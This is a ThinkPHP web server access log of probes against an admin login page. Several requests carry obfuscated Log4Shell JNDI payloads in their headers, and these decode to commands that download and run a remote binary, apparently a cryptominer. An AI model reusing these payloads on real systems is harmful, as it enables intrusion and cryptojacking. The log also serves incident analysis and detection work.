[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T12:00:43+08:00 ] 104.131.92.39 GET 113.116.132.17:8081/
[运行时间：0.007412s] [吞吐率：134.91req/s] [内存消耗：490.43kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T12:00:44+08:00 ] 104.131.92.39 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.006930s] [吞吐率：144.30req/s] [内存消耗：487.30kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
  'accept' => '*/*',
  'cookie' => 'PHPSESSID=mfs64527sepniigh2f4elqs3n6',
  'referer' => 'http://113.116.132.17:8081/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T12:02:31+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.040041s] [吞吐率：24.97req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T12:02:32+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003117s] [吞吐率：320.84req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T12:04:54+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/:8081
[运行时间：0.004739s] [吞吐率：211.01req/s] [内存消耗：503.89kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'referer' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/:8081' => '',
)
---------------------------------------------------------------
[ 2022-01-04T12:05:11+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.006843s] [吞吐率：146.13req/s] [内存消耗：491.07kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'referer' => 'http://113.116.132.17:8081/:8081',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T12:07:16+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/
[运行时间：0.004408s] [吞吐率：226.87req/s] [内存消耗：496.39kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'referer' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T12:07:34+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.004014s] [吞吐率：249.13req/s] [内存消耗：491.06kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'referer' => 'http://113.116.132.17:8081/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY3LjcxLjE5NS4xNzMvYmFzaDsgY2htb2QgNzc3IGJhc2g7IC4vYmFzaCAtYSByeC8wIC1vIDUxLjY4LjIxLjE4ODo0NDQ0IC11IDhBb2pSbzVBaGhLV0pIdFNZYXRUNmJROURrV3ZScGs1TmFxWWVvQmVYMzUzVXBVa1J1cERkMkY5elhYUFFxS0VrNFl5TFh5aDQ0R1FmRW0yd2RodXNnUFRDV3JwU2RTIC0tbWF4LWNwdS11c2FnZSAxMDAgLS1jcHUtcHJpb3JpdHkgNA==}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T12:43:55+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/
[运行时间：0.004090s] [吞吐率：244.51req/s] [内存消耗：496.64kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'referer' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T12:44:14+08:00 ] 143.198.71.190 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.008798s] [吞吐率：113.66req/s] [内存消耗：492.15kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'referer' => 'http://113.116.132.17:8081/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//51.79.240.74:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwczovL2xlZ2Fkby5vYWJ0by5vcmcuYnIvaC5waHA7IHdnZXQgaHR0cDovLzE2Ny43MS4xOTUuMTczL2Jhc2g7IGNobW9kIDc3NyBiYXNoOyAuL2Jhc2ggLWEgcngvMCAtbyBTdHJBdHVNK3RjUDovL1JBbkRPbXhNT05Fcm8uRVUtV2VTdC5uaUNFSGFzaC5DT006MzM4MCAtdSAzNEF6cWtMb3U2bmR2VzhIb3BLem5XVWliV3NGUnVnOE1wLms0c2ggLS1tYXgtY3B1LXVzYWdlIDEwMCAtLWNwdS1wcmlvcml0eSA0}\')',
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T13:03:02+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003571s] [吞吐率：280.03req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T13:03:02+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003446s] [吞吐率：290.20req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T13:35:01+08:00 ] 192.168.10.58 GET pcadmin.aoi.bj/padmin/adminlogin/index.html
[运行时间：0.006638s] [吞吐率：150.65req/s] [内存消耗：487.02kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T14:02:44+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003723s] [吞吐率：268.59req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T14:02:45+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003333s] [吞吐率：300.04req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T14:22:24+08:00 ] 192.168.10.58 POST pcadmin.aoi.bj/padmin/adminlogin/loginaction.html
[运行时间：1.393678s] [吞吐率：0.72req/s] [内存消耗：692.74kb] [文件加载：79]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'pcadmin.aoi.bj',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'x-requested-with' => 'XMLHttpRequest',
  'content-length' => '31',
  'origin' => 'http://pcadmin.aoi.bj',
  'connection' => 'keep-alive',
  'referer' => 'http://pcadmin.aoi.bj/padmin/adminlogin/index.html',
